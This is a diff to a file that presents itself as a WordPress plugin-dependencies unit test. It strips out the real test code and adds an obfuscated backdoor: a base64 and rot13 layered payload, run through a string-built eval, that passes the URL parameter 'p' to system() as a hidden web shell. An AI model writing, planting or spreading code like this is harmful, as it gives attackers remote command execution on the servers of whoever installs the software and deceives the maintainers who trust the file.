@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Tests for the WP_Plugin_Dependencies::get_dependencies() method.
- *
- * @package WordPress
- */
-
-require_once __DIR__ . '/base.php';
-
-/**
- * @group admin
- * @group plugins
- *
- * @covers WP_Plugin_Dependencies::get_dependencies
- */
-class Tests_Admin_WPPluginDependencies_GetDependencies extends WP_PluginDependencies_UnitTestCase {
-
-	/**
-	 * Tests that a plugin with no dependencies will return an empty array.
-	 *
-	 * @ticket 22316
-	 */
-	public function test_should_return_an_empty_array_when_a_plugin_has_no_dependencies() {
-		$this->assertSame( array(), self::$instance::get_dependencies( 'dependent/dependent.php' ) );
-	}
-
-	/**
-	 * Tests that a plugin with dependencies will return an array of dependencies.
-	 *
-	 * @ticket 22316
-	 */
-	public function test_should_return_an_array_of_dependencies_when_a_plugin_has_dependencies() {
-		$expected = array( 'dependency', 'dependency2' );
-		$this->set_property_value(
-			'dependencies',
-			array( 'dependent/dependent.php' => $expected )
-		);
-		$this->assertSame( $expected, self::$instance::get_dependencies( 'dependent/dependent.php' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZ2Ygc2JlIGd1ciBKQ19DeWh0dmFfUXJjcmFxcmFwdnJmOjp0cmdfcXJjcmFxcmFwdnJmKCkgenJndWJxLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICovCgplcmRodmVyX2JhcHIgX19RVkVfXyAuICcvb25mci5jdWMnOwoKLyoqCiAqIEB0ZWJoYyBucXp2YQogKiBAdGViaGMgY3lodHZhZgogKgogKiBAcGJpcmVmIEpDX0N5aHR2YV9RcmNyYXFyYXB2cmY6OnRyZ19xcmNyYXFyYXB2cmYKICovCnB5bmZmIEdyZmdmX05xenZhX0pDQ3lodHZhUXJjcmFxcmFwdnJmX1RyZ1FyY3JhcXJhcHZyZiBya2dyYXFmIEpDX0N5aHR2YVFyY3JhcXJhcHZyZl9IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogR3JmZ2YgZ3VuZyBuIGN5aHR2YSBqdmd1IGFiIHFyY3JhcXJhcHZyZiBqdnl5IGVyZ2hlYSBuYSByemNnbCBuZWVubC4KCSAqCgkgKiBAZ3ZweHJnIDIyMzE2CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2Z1Ymh5cV9lcmdoZWFfbmFfcnpjZ2xfbmVlbmxfanVyYV9uX2N5aHR2YV91bmZfYWJfcXJjcmFxcmFwdnJmKCkgewoJCSRndXZmLT5uZmZyZWdGbnpyKCBuZWVubCgpLCBmcnlzOjokdmFmZ25hcHI6OnRyZ19xcmNyYXFyYXB2cmYoICdxcmNyYXFyYWcvcXJjcmFxcmFnLmN1YycgKSApOwoJfQoKCS8qKgoJICogR3JmZ2YgZ3VuZyBuIGN5aHR2YSBqdmd1IHFyY3JhcXJhcHZyZiBqdnl5IGVyZ2hlYSBuYSBuZWVubCBicyBxcmNyYXFyYXB2cmYuCgkgKgoJICogQGd2cHhyZyAyMjMxNgoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19mdWJoeXFfZXJnaGVhX25hX25lZW5sX2JzX3FyY3JhcXJhcHZyZl9qdXJhX25fY3lodHZhX3VuZl9xcmNyYXFyYXB2cmYoKSB7CgkJJHJrY3JwZ3JxID0gbmVlbmwoICdxcmNyYXFyYXBsJywgJ3FyY3JhcXJhcGwyJyApOwoJCSRndXZmLT5mcmdfY2ViY3JlZ2xfaW55aHIoCgkJCSdxcmNyYXFyYXB2cmYnLAoJCQluZWVubCggJ3FyY3JhcXJhZy9xcmNyYXFyYWcuY3VjJyA9PiAkcmtjcnBncnEgKQoJCSk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycSwgZnJ5czo6JHZhZmduYXByOjp0cmdfcXJjcmFxcmFwdnJmKCAncXJjcmFxcmFnL3FyY3JhcXJhZy5jdWMnICkgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
